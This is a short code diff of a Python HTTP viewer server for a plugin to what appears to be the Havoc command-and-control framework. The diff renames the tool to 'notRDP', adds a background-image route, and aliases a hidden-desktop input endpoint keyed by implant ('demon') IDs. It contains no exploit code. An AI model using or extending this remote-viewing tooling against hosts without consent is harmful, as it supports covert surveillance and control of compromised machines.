@@ -1,12 +1,11 @@
 """
-_viewer_server.py - Standalone HTTP viewer server for havoc-screenshare
+_viewer_server.py - HTTP viewer server for notRDP
 
 Runs as a separate process launched by the Havoc plugin.
 Reads frame JPEGs and input commands via a shared temp directory.
 Supports long-polling for near-instant frame delivery.
 
-Usage (launched automatically by screenshare.py):
-    python3 _viewer_server.py <port> <shared_dir> <viewer_html_path>
+Author:  Dhanush Arvind
 """
 
 import json
@@ -45,6 +44,15 @@ class ViewerHandler(BaseHTTPRequestHandler):
 
         if self.path.startswith("/api/frame/"):
             self._handle_frame()
+            return
+
+        if self.path == "/bg.png":
+            bg_path = os.path.join(_shared_dir, "bg.png")
+            try:
+                with open(bg_path, "rb") as f:
+                    self._respond(200, "image/png", f.read())
+            except FileNotFoundError:
+                self._respond(404, "text/plain", b"Not found")
             return
 
         if self.path == "/api/status":
@@ -137,13 +145,13 @@ class ViewerHandler(BaseHTTPRequestHandler):
                               json.dumps({"error": str(e)}).encode())
             return
 
-        if self.path == "/api/hdesktop":
+        if self.path == "/api/hdesktop" or self.path == "/api/notrdp":
             length = int(self.headers.get("Content-Length", 0))
             body = self.rfile.read(length) if length else b""
             try:
                 data = json.loads(body)
                 demon_id = data.get("demon_id", "unknown")
-                hd_file = os.path.join(_shared_dir, demon_id + "_hdesktop.json")
+                hd_file = os.path.join(_shared_dir, demon_id + "_notrdp.json")
                 pending = []
                 try:
                     with open(hd_file, "r") as f:
